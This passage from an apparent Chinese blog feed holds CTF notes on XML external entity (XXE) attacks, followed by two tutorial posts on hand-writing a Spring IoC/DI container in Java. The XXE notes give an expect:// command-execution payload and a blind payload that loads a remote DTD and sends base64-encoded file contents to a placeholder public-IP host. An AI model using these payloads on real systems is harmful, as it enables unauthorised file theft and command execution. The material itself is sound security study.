class="headerlink" title="挖掘xxe肉冻"></a>挖掘xxe肉冻</h3><ul><li><strong>利用条件</strong>：<ul><li>libxml小于2.9.1</li><li>libxml_disable_entity_loader选项设置为false</li></ul></li><li><strong>使用</strong>：通过xxe读取目标文件内容，一般就这么用，读的就是&#x2F;etc&#x2F;password文件，执行操作系统命令不现实</li><li><strong>发现</strong>：<ul><li>抓包看accept头是否接受xml</li><li>抓包修改数据类型，把json改为xml来传数据</li></ul></li></ul><h3 id="有回显的攻击"><a href="#有回显的攻击" class="headerlink" title="有回显的攻击"></a>有回显的攻击</h3><ul><li><p>[NCTF2019]Fake XML cookbook就是一个例子。</p></li><li><p>一般性</p><div class="code-wrapper"><pre><code class="hljs xml">[ run &quot;uname&quot; command]<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://uname&quot;</span> &gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></code></pre></div></li><li><p>当然也可以把<code>expect://uname</code>这个部分改为外链接来绕过某些过滤，但这就没意思了嗷</p></li></ul><h3 id="无回显攻击"><a href="#无回显攻击" class="headerlink" title="无回显攻击"></a>无回显攻击</h3><ul><li><p>建立一个dtd文件，在远程服务器上面放入dtd文件，利用以后如果无报错就需要查看数据日志文件信息，可以看base64编码以后的数据。</p></li><li><p>攻击的payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;公网IP/test.dtd&quot;</span> &gt;</span></span><span class="hljs-meta">%remote;%int;%send;</span><span class="hljs-meta">]&gt;</span></code></pre></div></li><li><p>test.dtd内容</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windwos/win.ini&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://公网IP?p=%file;&#x27;&gt;&quot;</span>&gt;</span></code></pre></div></li><li><p>无报错需要访问接受数据库的日志信息，base64解码可以得到数据</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day3下午</title>
    <link href="/2022/08/15/spring_day03.1/"/>
    <url>/2022/08/15/spring_day03.1/</url>
    
    <content type="html"><![CDATA[<h1 id="Day03下午—Spring-完成DI"><a href="#Day03下午—Spring-完成DI" class="headerlink" title="Day03下午—Spring 完成DI"></a>Day03下午—Spring 完成DI</h1><p>[TOC]</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li><p>入口：getBean()方法</p></li><li><p>ApplicationContext中定义好IoC容器</p></li><li><p>BeanWrapper保存到Map中</p></li><li><p>所以设计两个Map</p><ul><li>factoryBeanObjectCache：保存单例对象的缓存</li><li>factoryBeanInstanceCache：保存BeanWrapper的缓存</li></ul><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;...          <span class="hljs-comment">//用来保证注册式单例的容器</span>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; factoryBeanObjectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();    <span class="hljs-comment">//用来存储所有的被代理过的对象</span>    <span class="hljs-keyword">private</span> Map&lt;String,MyBeanWrapper&gt; factoryBeanInstanceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();     ...</code></pre></div></li></ul><h2 id="完善getBean"><a href="#完善getBean" class="headerlink" title="完善getBean()"></a>完善getBean()</h2><ul><li><p>BeanPostProcessor：我们知道它是原生spring中为对象初始化事件设置的一种回调机制。暂时只做声明，没做具体实现。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.config;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanPostProcessor</span> &#123;    <span class="hljs-comment">//TODO 为在Bean的初始化之前提供回调接口</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessBeforeInitialization</span><span class="hljs-params">(Object bean,String beanName)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-keyword">return</span> bean;    &#125;    <span class="hljs-comment">//TODO 为在Bean的初始化之后提供回调接口</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessAfterInitialization</span><span class="hljs-params">(Object bean,String beanName)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-keyword">return</span> bean;    &#125;&#125;</code></pre></div></li><li><p>在MyApplicationContext完善代码</p></li><li><p>大体流程</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-type">MyBeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.beanDefinitionMap.get(beanName);    <span class="hljs-comment">//生成通知事件</span>    <span class="hljs-type">MyBeanPostProcessor</span> <span class="hljs-variable">beanPostProcessor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanPostProcessor</span>();      <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> instantiateBean(beanDefinition);    <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == instance)<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;      <span class="hljs-comment">//在实例初始化以前调用一次</span>    beanPostProcessor.postProcessBeforeInitialization(instance,beanName);      <span class="hljs-type">MyBeanWrapper</span> <span class="hljs-variable">beanWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanWrapper</span>(instance);      <span class="hljs-built_in">this</span>.factoryBeanInstanceCache.put(beanName,beanWrapper);      <span class="hljs-comment">//在是实例初始化以后再调用一次</span>    beanPostProcessor.postProcessAfterInitialization(instance,beanName);      populateBean(beanName,instance);        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.factoryBeanInstanceCache.get(beanName).getWrappedInstance();&#125;</code></pre></div></li><li><p>instantiateBean方法：返回一个实例Bean</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">instantiateBean</span><span class="hljs-params">(MyBeanDefinition beanDefinition)</span> &#123;    <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-type">String</span> <span class="hljs-variable">beanClassName</span> <span class="hljs-operator">=</span> beanDefinition.getBeanClassName();      <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//因为根据Class才能确定一个类是否有实例</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.factoryBeanObjectCache.containsKey(beanClassName))&#123;            instance = <span class="hljs-built_in">this</span>.factoryBeanObjectCache.get(beanClassName);        &#125;<span class="hljs-keyword">else</span> &#123;            Class&lt;?&gt; clazz = Class.forName(beanClassName);            instance = clazz.newInstance();            <span class="hljs-built_in">this</span>.factoryBeanObjectCache.put(beanDefinition.getFactoryBeanName(),instance);        &#125;        <span class="hljs-keyword">return</span> instance;    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;        e.printStackTrace();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;</code></pre></div></li><li><p>populateBean方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">populateBean</span><span class="hljs-params">(String beanName, Object instance)</span> &#123;      Class&lt;?&gt; clazz = instance.getClass();            <span class="hljs-keyword">if</span> (!(clazz.isAnnotationPresent(MyController.class) || clazz.isAnnotationPresent(MyService.class)))&#123;          <span class="hljs-keyword">return</span>;      &#125;        Field[] fields = clazz.getDeclaredFields();      <span class="hljs-keyword">for</span> (Field field : fields) &#123;          <span class="hljs-keyword">if</span>(!field.isAnnotationPresent(MyAutowired.class))<span class="hljs-keyword">continue</span>;            <span class="hljs-type">MyAutowired</span> <span class="hljs-variable">autowired</span> <span class="hljs-operator">=</span> field.getAnnotation(MyAutowired.class);                    <span class="hljs-type">String</span> <span class="hljs-variable">autowiredBeanName</span> <span class="hljs-operator">=</span> autowired.value().trim();                    <span class="hljs-comment">//没有指定beanName就采用默认类名作为beanName</span>          <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;&quot;</span>.equals(autowiredBeanName))&#123;              autowiredBeanName = field.getType().getName();          &#125;                    field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-keyword">try</span> &#123;              field.set(instance,<span class="hljs-built_in">this</span>.factoryBeanInstanceCache.get(autowiredBeanName).getWrappedInstance());          &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;              e.printStackTrace();          &#125;      &#125;  &#125;</code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day3上午</title>
    <link href="/2022/08/15/spring_day03/"/>
    <url>/2022/08/15/spring_day03/</url>
    
    <content type="html"><![CDATA[<h1 id="Day03上午—Spring-IoC顶层结构设计"><a href="#Day03上午—Spring-IoC顶层结构设计" class="headerlink" title="Day03上午—Spring IoC顶层结构设计"></a>Day03上午—Spring IoC顶层结构设计</h1><p>[TOC]</p><h2 id="core-顶层接口-核心模块"><a href="#core-顶层接口-核心模块" class="headerlink" title="core(顶层接口)核心模块"></a>core(顶层接口)核心模块</h2><ul><li><p>区分BeanFactory和FactoryBean：</p><ul><li>BeanFactory：Bean工厂，是个工厂，也就是IoC容器的最高层接口，作用时管理Bean</li><li>FactoryBean：工厂Bean，是一个Bean，作用时产生其他Bean的实例</li></ul></li><li><p>创建core包，再撸</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.core;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyFactoryBean</span> &#123;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.core;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 单例工厂的顶层设计</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 根据beanName从IoC容器中获取一个实例Bean</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> beanName</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><span class="hljs-comment">     */</span>    Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception;        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;?&gt; beanClass)</span> <span class="hljs-keyword">throws</span> Exception;&#125;</code></pre></div></li></ul><h2 id="beans-配置封装-模块"><a href="#beans-配置封装-模块" class="headerlink" title="beans(配置封装)模块"></a>beans(配置封装)模块</h2><ul><li><p>创建包beans.config，再撸</p></li><li><p>BeanDefinition:主要用于保存Bean相关的配置信息</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.config;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanDefinition</span> &#123;    <span class="hljs-comment">//原生Bean的全类名</span>    <span class="hljs-keyword">private</span> String beanClassName;    <span class="hljs-comment">//标记是否延时加载，默认为false</span>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">lazyInit</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">//保存beanName,在IoC容器中存储的key</span>    <span class="hljs-keyword">private</span> String factoryBeanName;&#125;</code></pre></div></li><li><p>BeanWrapper：主要用于封装创建后的实例对象，代理对象或者原生对象都有BeanWrapper来保存</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanWrapper</span> &#123;    <span class="hljs-keyword">private</span> Object wrappedInstance;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBeanWrapper</span><span class="hljs-params">(Object wrappedInstance)</span>&#123;        <span class="hljs-built_in">this</span>.wrappedInstance = wrappedInstance;    &#125;        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getWrappedInstance</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappedInstance;    &#125;    <span class="hljs-comment">// 返回代理以后的Class</span>    <span class="hljs-comment">// 可能会是这个 $Proxy0</span>    <span class="hljs-keyword">public</span> Class&lt;?&gt; getWrappedClass()&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappedInstance.getClass();    &#125;&#125;</code></pre></div></li></ul><h2 id="context-IoC容器-模块"><a href="#context-IoC容器-模块" class="headerlink" title="context(IoC容器)模块"></a>context(IoC容器)模块</h2><ul><li><p>AbstractApplicationContext：IoC容器实现类的顶层抽象类，实现IoC容器相关的公共逻辑。为了尽可能地简单化，暂时只设计一个refresh()方法。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context.support;<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAbstractApplicationContext</span> &#123;    <span class="hljs-comment">//受保护，只提供给子类重写</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;&#125;&#125;</code></pre></div></li><li><p>DefaultListableBeanFactory：众多IoC容器的典型代表，暂时只设计一个顶层的IoC缓存，也就是beanDefinitionMap。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> com.czh.spring.framework.context.support.MyAbstractApplicationContext;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractApplicationContext</span> &#123;    <span class="hljs-comment">//存储注册信息的BeanDefinition,伪IOC容器</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Map&lt;String, MyBeanDefinition&gt; beanDefinitionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;String, MyBeanDefinition&gt;();&#125;</code></pre></div></li><li><p>BeanDefinitionReader：完成对application.properties配置文件的解析工作，实现看代码（请细品）</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 对配置文件进行查找、读取、解析</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanDefinitionReader</span> &#123;        <span class="hljs-keyword">private</span> List&lt;String&gt; registerBeanClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();    <span class="hljs-keyword">private</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        <span class="hljs-comment">//固定配置文件中的key，相对于XML的规范</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SCAN_PACKAGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;scanPackage&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBeanDefinitionReader</span><span class="hljs-params">(String...locations)</span>&#123;        <span class="hljs-comment">//通过URL定位找到其所对应的文件，然后转换为文件流</span>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResourceAsStream(locations[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;classpath:&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));        <span class="hljs-keyword">try</span> &#123;            config.load(is);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;<span class="hljs-keyword">finally</span> &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != is)&#123;                <span class="hljs-keyword">try</span> &#123;                    is.close();                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;                doScanner(config.getProperty(SCAN_PACKAGE));    &#125;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doScanner</span><span class="hljs-params">(String scanPackage)</span>&#123;        <span class="hljs-comment">//转换为文件路径，实际上就是把.换成/</span>        <span class="hljs-comment">//利用正则巧妙处理，你说妙不妙</span>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;/&quot;</span>+scanPackage.replaceAll(<span class="hljs-string">&quot;\\.&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));        <span class="hljs-type">File</span> <span class="hljs-variable">classPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(url.getFile());        <span class="hljs-keyword">for</span> (File file : classPath.listFiles()) &#123;            <span class="hljs-keyword">if</span>(file.isDirectory())&#123;                <span class="hljs-comment">//如果是目录就接着递归扫描</span>                doScanner(scanPackage+<span class="hljs-string">&quot;.&quot;</span>+file.getName());            &#125;<span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">if</span>(!file.getName().endsWith(<span class="hljs-string">&quot;.class&quot;</span>))<span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果不是class文件就跳过</span>                <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> (scanPackage + <span class="hljs-string">&quot;.&quot;</span> +file.getName().replace(<span class="hljs-string">&quot;.class&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<span class="hljs-comment">//拼接出className</span>                registerBeanClasses.add(className);            &#125;        &#125;    &#125;        <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.config;    &#125;    <span class="hljs-comment">//把配置文件中扫描到的所有配置信息转换为BeanDefinition对象，便于后面IoC操作</span>    <span class="hljs-keyword">public</span> List&lt;MyBeanDefinition&gt; <span class="hljs-title function_">loadBeanDefinitions</span><span class="hljs-params">()</span>&#123;        ArrayList&lt;MyBeanDefinition&gt; beanDefinitionList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">for</span> (String className : registerBeanClasses) &#123;                Class&lt;?&gt; beanClass = Class.forName(className);                <span class="hljs-keyword">if</span>(beanClass.isInterface())<span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果是接口就跳过，因为接口从类中获取</span>                                beanDefinitionList.add(doCreateBeanDefinition(toLowerFirstCase(beanClass.getSimpleName()),beanClass.getName()));                    Class&lt;?&gt;[] interfaces = beanClass.getInterfaces();                <span class="hljs-keyword">for</span> (Class&lt;?&gt; anInterface : interfaces) &#123;                    beanDefinitionList.add(doCreateBeanDefinition(anInterface.getName(),beanClass.getName()));                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-keyword">return</span> beanDefinitionList;    &#125;    <span class="hljs-comment">//把每一个配置信息解析成一个BeanDefinition</span>    <span class="hljs-keyword">private</span> MyBeanDefinition <span class="hljs-title function_">doCreateBeanDefinition</span><span class="hljs-params">(String factoryBeanName, String beanClassName)</span> &#123;        <span class="hljs-type">MyBeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanDefinition</span>();        beanDefinition.setBeanClassName(beanClassName);        beanDefinition.setFactoryBeanName(factoryBeanName);        <span class="hljs-keyword">return</span> beanDefinition;    &#125;    <span class="hljs-comment">//将类名首字母改为小写</span>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toLowerFirstCase</span><span class="hljs-params">(String simpleName)</span>&#123;        <span class="hljs-type">char</span>[] chars = simpleName.toCharArray();        chars[<span class="hljs-number">0</span>] += <span class="hljs-number">32</span>;        <span class="hljs-keyword">return</span> String.valueOf(chars);    &#125;    &#125;</code></pre></div></li><li><p>ApplicationContext：直接接触用户的入口，实现DefaultListableBeanFactory中的refresh()方法和BeanFactory的getBean()方法，完成IoC、DI、AOP的衔接</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.support.MyBeanDefinitionReader;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.support.MyDefaultListableBeanFactory;<span class="hljs-keyword">import</span> com.czh.spring.framework.core.MyBeanFactory;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;    <span class="hljs-keyword">private</span> String[] configLocations;    <span class="hljs-keyword">private</span> MyBeanDefinitionReader reader;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyApplicationContext</span><span class="hljs-params">(String...configLocations)</span>&#123;        <span class="hljs-built_in">this</span>.configLocations = configLocations;        <span class="hljs-keyword">try</span> &#123;            refresh();        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">//1.定位配置文件</span>        reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanDefinitionReader</span>(<span class="hljs-built_in">this</span>.configLocations);        <span class="hljs-comment">//2.加载配置文件，扫描相关的类，封装成BeanDefinition</span>        List&lt;MyBeanDefinition&gt; beanDefinitionList = reader.loadBeanDefinitions();        <span class="hljs-comment">//3.注册，把配置信息放到容器中(伪IoC容器)</span>        doRegisterBeanDefinition(beanDefinitionList);        <span class="hljs-comment">//4.把不是延时加载的类提前初始化</span>        doAutowired();    &#125;    <span class="hljs-comment">//只处理非延时加载的情况</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAutowired</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, MyBeanDefinition&gt; beanDefinitionEntry : beanDefinitionMap.entrySet()) &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> beanDefinitionEntry.getKey();            <span class="hljs-keyword">if</span>(!beanDefinitionEntry.getValue().isLazyInit())&#123;                <span class="hljs-keyword">try</span> &#123;                    getBean(beanName);                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doRegisterBeanDefinition</span><span class="hljs-params">(List&lt;MyBeanDefinition&gt; beanDefinitionList)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">for</span> (MyBeanDefinition beanDefinition : beanDefinitionList) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">super</span>.beanDefinitionMap.containsKey(beanDefinition.getFactoryBeanName()))&#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;The \&quot;&quot;</span>+beanDefinition.getFactoryBeanName()+<span class="hljs-string">&quot;\&quot; is exist!!!&quot;</span>);            &#125;            <span class="hljs-built_in">super</span>.beanDefinitionMap.put(beanDefinition.getFactoryBeanName(),beanDefinition);            <span class="hljs-comment">//到这容器初始化完毕</span>        &#125;    &#125;    <span class="hljs-comment">// TODO 依赖注入从这里开始，读取BeanDefinition中的信息，然后通过反射创建一个实例并返回，不会放原始对象进去，spring</span>    <span class="hljs-comment">// TODO 里面会用一个BeanWrapper进行一次包装</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;?&gt; beanClass)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> getBean(beanClass.getName());    &#125;        <span class="hljs-keyword">public</span> String[] getBeanDefinitionNames()&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.beanDefinitionMap.keySet().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[getBeanDefinitionCount()]);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBeanDefinitionCount</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.beanDefinitionMap.size();    &#125;        <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.reader.getConfig();    &#125;    &#125;</code></pre></div></li><li><p>ApplicationContextAware：通过实现侦听机制得到一个回调方法，从而得到一个上下文，即ApplicationContext，先做设计，后面再看情况</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 通过解耦方式获得IOC容器的顶层设计</span><span class="hljs-comment"> * 后面将通过一个监听器去扫描所有的类，只要实现了此接口，</span><span class="hljs-comment"> * 将自动调用setApplicationContext()方法，从而将IOC容器注入到目标类中</span><span class="hljs-comment"> * Created by czh</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title 